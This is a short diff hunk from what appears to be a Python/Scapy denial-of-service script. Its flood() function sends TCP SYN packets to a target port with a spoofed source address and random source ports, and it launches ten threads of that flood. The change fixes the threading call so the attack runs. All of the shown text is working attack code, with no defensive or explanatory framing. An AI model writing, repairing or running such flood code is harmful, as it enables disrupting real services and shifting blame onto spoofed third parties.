@@ -15,5 +15,5 @@ def flood():
 		send(IP(dst=target, src=culprits)/TCP(sport=RandShort(), dport=port, flags="S"), verbose=0)
 		
 for i in range(10):
-	thread.Thread(target=flood).start()
+	threading.Thread(target=flood).start()
 
